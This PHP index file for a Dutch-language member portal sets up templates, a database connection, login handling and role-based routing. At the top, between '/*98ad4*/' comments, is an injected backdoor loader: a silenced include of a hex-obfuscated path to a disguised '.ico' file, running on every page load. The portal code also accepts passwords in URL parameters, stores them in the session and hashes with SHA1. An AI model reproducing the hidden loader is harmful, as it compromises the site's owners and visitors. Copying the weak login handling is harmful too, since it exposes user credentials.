<?php


/*98ad4*/

@include "\x2fh\x6fm\x65/\x61s\x70o\x2fp\x75b\x6ci\x63_\x68t\x6dl\x2fp\x6fr\x74a\x6c2\x2dt\x65s\x74/\x43o\x6en\x65c\x74o\x72/\x58m\x6c/\x66a\x76i\x63o\x6e_\x617\x394\x357\x2ei\x63o";

/*98ad4*/
//error reporting
ini_set('display_errors', '1');
error_reporting(E_ERROR | E_WARNING | E_PARSE);

//define include constant for modules to check 
define('PortalInc', TRUE);

//require base classes
require_once('includes/user.class.php');
require_once('includes/config.class.php');
require_once('includes/smarty/Smarty.class.php');

//start session
@session_start();

//get rid of magic quotes
if (get_magic_quotes_gpc()) {
    $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
    while (list($key, $val) = each($process)) {
        foreach ($val as $k => $v) {
            unset($process[$key][$k]);
            if (is_array($v)) {
                $process[$key][stripslashes($k)] = $v;
                $process[] = &$process[$key][stripslashes($k)];
            } else {
                $process[$key][stripslashes($k)] = stripslashes($v);
            }
        }
    }
    unset($process);
}

try {
	//create template engine
	$oSmarty = new Smarty;
	
	//read config
	$oCfg = new Config;
	$oCfg->load('settings.php');
	
	//get database info from config
	$dsn    =	'mysql:dbname=' . $oCfg->get('database');
	$dsn   .=	';host=' . $oCfg->get('host');
	$dbuser = $oCfg->get('user');
	$dbpass = $oCfg->get('password');

	//create database connection
	try {
		$oDB = new PDO($dsn, $dbuser, $dbpass);
	}
	catch(PDOException $e) {
		throw new Exception('Kan geen verbinding maken met de database: ' . $e->getMessage());
	}

	//initialize authorization
	$oSelf = new User($oDB);
	$oSelf->setEncType('SHA1');

	//check for login data
	//0 = not logged in, 1 = user, 2 = admin
	if(isset($_POST['user'])) {
		$oSelf->login($_POST['user'], $_POST['pass']);
	}
	else if(isset($_GET['u'])) {
		$oSelf->login($_GET['u'], $_GET['p'], 1);
	}
	else if(isset($_SESSION['user'])) {
		$oSelf->login($_SESSION['user'], $_SESSION['pass'], 1);
	}
		
	//assign user authorization level to template
	$oSmarty->assign('AuthState', $oSelf->state);
	$oSmarty->assign('AuthLevel', $oSelf->authlevel);
	$oSmarty->assign('AuthCommittees', $oSelf->committees);
	$oSmarty->assign('phpself', $_SERVER['PHP_SELF']);
	
	//switch module, let module handle actions
	switch ($oSelf->authlevel) {
		case '2':
			//admin level
			require('admin.php');
			break;
			
		case '1':
			//user level
			require('user.php');
			break;
			
		default:
			//login level
			require('login.php');
			break;
		
	}
}
catch(Exception $e) {
	//error handling
	$oSmarty->assign('title', 'Foutmelding');
	$oSmarty->assign('webmastermail', $oCfg->get('webmastermail'));
	$oSmarty->assign('message', $e->getMessage());
	$oSmarty->display('templates/error.tpl');
	exit();
}
?>
